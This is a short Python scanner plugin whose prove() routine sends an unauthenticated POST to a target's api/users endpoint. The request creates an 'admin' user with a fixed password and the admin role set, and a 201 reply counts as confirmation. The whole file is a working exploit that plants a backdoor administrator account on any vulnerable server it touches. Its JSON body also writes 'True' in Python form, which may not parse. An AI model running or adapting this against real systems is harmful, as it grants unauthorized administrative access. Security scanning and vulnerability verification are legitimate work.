#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: orleven

from lib.util.aiohttputil import ClientSession
from lib.core.enums import ServicePortMap
from script import BaseScript

class Script(BaseScript):

    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.WEB

    async def prove(self):
        if self.base_url:
            async with ClientSession() as session:
                url = self.base_url + 'api/users'
                data = '{"email":"admin@admin.com","password":"Abc@123456","realname":"xxx","username":"admin","has_admin_role":True}'
                headers = {'Content-Type': "application/json"}
                async with session.post(url=url, data=data, headers=headers) as res:
                    if res and res.status == 201:
                        yield url